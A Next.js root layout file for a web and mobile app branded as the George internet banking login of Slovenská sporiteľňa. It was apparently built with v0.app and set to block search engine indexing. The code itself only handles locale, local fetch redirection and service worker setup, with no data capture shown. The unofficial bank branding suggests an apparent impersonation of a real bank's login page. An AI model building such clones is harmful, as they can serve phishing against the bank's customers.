import { Inter } from 'next/font/google'
import type { Metadata, Viewport } from 'next'
import Script from 'next/script'
import './globals.css'
import { cookies } from 'next/headers'
import { getDictionary, Locale } from '@/lib/i18n'
import { TranslationProvider } from '@/components/providers/translation-provider'

const inter = Inter({
  subsets: ['latin', 'latin-ext'],
  weight: ['400', '500', '600', '700'],
  display: 'swap',
  variable: '--font-inter',
  preload: true,
})
export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  themeColor: '#091b3f',
  // Required for env(safe-area-inset-*) under notch / Dynamic Island (Capacitor WKWebView).
  viewportFit: 'cover',
}

export const metadata: Metadata = {
  title: 'George – nový Internetbanking – Slovenská sporiteľňa, a.s.',
  description: 'Prihláste sa do nového Internetbankingu Slovenskej sporiteľne. S Georgeom bankujete jednoduchšie a s väčším prehľadom.',
  generator: 'v0.app',
  applicationName: 'George',
  robots: {
    index: false,
    follow: false,
    nocache: true,
    googleBot: {
      index: false,
      follow: false,
      noimageindex: true,
      'max-video-preview': -1,
      'max-image-preview': 'none',
      'max-snippet': -1,
    },
  },
  appleWebApp: {
    capable: true,
    statusBarStyle: 'black-translucent',
    title: 'George',
  },
  formatDetection: {
    telephone: false,
  },
  manifest: '/manifest.json',
  icons: {
    icon: [
      { url: '/favicon-32x32.png', sizes: '32x32', type: 'image/png' },
      { url: '/favicon-16x16.png', sizes: '16x16', type: 'image/png' }
    ],
    apple: [
      { url: '/apple-touch-icon.png', sizes: '180x180', type: 'image/png' }
    ],
    shortcut: '/favicon.ico',
  },
}

export default async function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  const cookieStore = await cookies()
  const localeCookie = cookieStore.get('NEXT_LOCALE')
  const locale = (localeCookie?.value === 'en' ? 'en' : 'sk') as Locale
  const dictionary = getDictionary(locale)

  return (
    <html lang={locale} className={inter.variable} suppressHydrationWarning>
      <head>
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <Script id="capacitor-fetch-redirect" strategy="beforeInteractive">
          {`
            if (typeof window !== 'undefined') {
              // Capacitor live-reload (server.url) already serves from http(s) localhost/LAN.
              // Only remap relative fetch for file:// / capacitor:// shells.
              // Never force Android 10.0.2.2 on iOS — that caused TypeError: Load failed.
              if (window.Capacitor || navigator.userAgent.includes('Capacitor')) {
                var originalFetch = window.fetch;
                window.fetch = function (input, init) {
                  if (typeof input === 'string' && input.startsWith('/')) {
                    var protocol = window.location.protocol || '';
                    if (protocol !== 'http:' && protocol !== 'https:') {
                      var platform =
                        (window.Capacitor &&
                          window.Capacitor.getPlatform &&
                          window.Capacitor.getPlatform()) ||
                        '';
                      var isAndroid =
                        platform === 'android' || /android/i.test(navigator.userAgent || '');
                      var host = isAndroid
                        ? 'http://10.0.2.2:3030'
                        : 'http://localhost:3030';
                      input = host + input;
                    }
                  }
                  return originalFetch.call(this, input, init);
                };
              }
            }
          `}
        </Script>
      </head>
      <body className="font-sans antialiased" suppressHydrationWarning>
        <TranslationProvider dictionary={dictionary} locale={locale}>
          {children}
        </TranslationProvider>
        <Script id="pwa-service-worker" strategy="afterInteractive">
          {`
            (function registerGeorgeServiceWorker() {
              if (!('serviceWorker' in navigator)) return;
              // Secure contexts only (HTTPS or localhost / 127.0.0.1)
              var host = location.hostname;
              var isLocal =
                host === 'localhost' ||
                host === '127.0.0.1' ||
                host === '[::1]' ||
                host.endsWith('.localhost');
              if (location.protocol !== 'https:' && !isLocal) return;

              var register = function () {
                navigator.serviceWorker
                  .register('/service-worker.js')
                  .then(function (reg) {
                    console.log('[PWA] Service Worker registered, scope:', reg.scope);
                    reg.addEventListener('updatefound', function () {
                      var newWorker = reg.installing;
                      if (!newWorker) return;
                      newWorker.addEventListener('statechange', function () {
                        if (newWorker.state === 'activated') {
                          console.log('[PWA] New Service Worker activated');
                        }
                      });
                    });
                  })
                  .catch(function (err) {
                    console.error('[PWA] Service Worker registration failed:', err);
                  });
              };

              // Register immediately when ready — do not wait for window "load"
              // (lazyOnload + load already-fired previously skipped registration).
              if (document.readyState === 'complete') {
                register();
              } else {
                window.addEventListener('load', register, { once: true });
              }
            })();
          `}
        </Script>
      </body>
    </html>
  )
}
